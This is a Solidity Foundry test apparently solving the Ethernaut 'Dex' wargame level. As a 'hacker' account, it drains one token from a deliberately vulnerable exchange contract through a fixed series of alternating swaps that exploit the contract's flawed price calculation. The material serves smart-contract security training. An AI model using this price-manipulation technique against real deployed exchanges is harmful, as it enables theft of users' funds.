// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "../src/levels/22-Dex/DexFactory.sol";

contract DexTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        vm.deal(hacker, 1 ether);
    }

    function testDexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(hacker, hacker);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(dexFactory);
        Dex ethernautDex = Dex(levelAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        address token1 = ethernautDex.token1();
        address token2 = ethernautDex.token2();

        ethernautDex.approve(address(ethernautDex), type(uint256).max);

        ethernautDex.swap(token1, token2, 10);
        ethernautDex.swap(token2, token1, 20);
        ethernautDex.swap(token1, token2, 24);
        ethernautDex.swap(token2, token1, 30);
        ethernautDex.swap(token1, token2, 41);
        ethernautDex.swap(token2, token1, 45);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
